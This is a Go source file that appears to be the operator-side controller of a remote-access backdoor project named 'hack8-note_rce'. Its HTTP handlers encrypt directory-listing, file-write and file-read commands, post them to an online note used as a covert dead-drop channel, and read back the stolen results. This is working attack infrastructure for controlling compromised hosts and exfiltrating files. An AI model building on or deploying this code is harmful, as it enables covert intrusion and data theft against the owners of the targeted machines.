package cotroller

import (
	"encoding/json"
	"github.com/gin-gonic/gin"
	"hack8-note_rce/Util"
	"hack8-note_rce/mode"
	"io"
	"net/http"
	"time"
)

// api/dir
func ListDirHandler(c *gin.Context) {
	dir := "filemanger.dir:" + c.Query("dir") // 获取查询参数dir，表示要列出的目录
	noteaddr := c.Query("noteaddr")
	aeskey := c.Query("aeskey")
	base64, _ := Util.AesCbcEncryptBase64([]byte(dir), []byte(aeskey), []byte(Util.Ivaes))
	Util.WriteNote(noteaddr, base64)
	time.Sleep(15 * time.Second)
	byBase64, _ := Util.AesCbcDecryptByBase64(Util.GetNote(noteaddr), []byte(aeskey), []byte(Util.Ivaes))
	var filelist []mode.File
	json.Unmarshal(byBase64, filelist)

	c.JSONP(200, Util.Jsonp(filelist))
}

// api/upload
func Upload(c *gin.Context) {
	file, err := c.FormFile("file")
	noteaddr := c.Query("noteaddr")
	aeskey := c.Query("aeskey")
	path := c.Query("path")
	if err != nil {
		c.JSON(400, gin.H{"error": err.Error()})
		return
	}
	f, err := file.Open()
	if err != nil {
		c.JSON(500, gin.H{"error": err.Error()})
		return
	}
	defer f.Close()
	data, err := io.ReadAll(f)
	if err != nil {
		c.JSON(500, gin.H{"error": err.Error()})
		return
	}
	base64, _ := Util.AesCbcEncryptBase64([]byte("filemanger.write:"+path+file.Filename+":"+string(data)), []byte(aeskey), []byte(Util.Ivaes))
	Util.WriteNote(noteaddr, base64)

	c.JSON(200, gin.H{"message": "上传请求已成功发"})
}

// api/fileDownload
func FileDownload(c *gin.Context) {
	file := c.Query("filename")
	noteaddr := c.Query("noteaddr")
	aeskey := c.Query("aeskey")
	path := c.Query("path")
	base64, _ := Util.AesCbcEncryptBase64([]byte("filemanger.read:"+path+file), []byte(aeskey), []byte(Util.Ivaes))
	Util.WriteNote(noteaddr, base64)
	time.Sleep(15 * time.Second)
	byBase64, _ := Util.AesCbcDecryptByBase64(Util.GetNote(noteaddr), []byte(aeskey), []byte(Util.Ivaes))

	c.Header("Content-Disposition", "attachment; filename="+file) // 这里是设置文件名
	c.Data(http.StatusOK, "application/octet-stream", byBase64)   // 这里是将字节切片作为响应发送
}
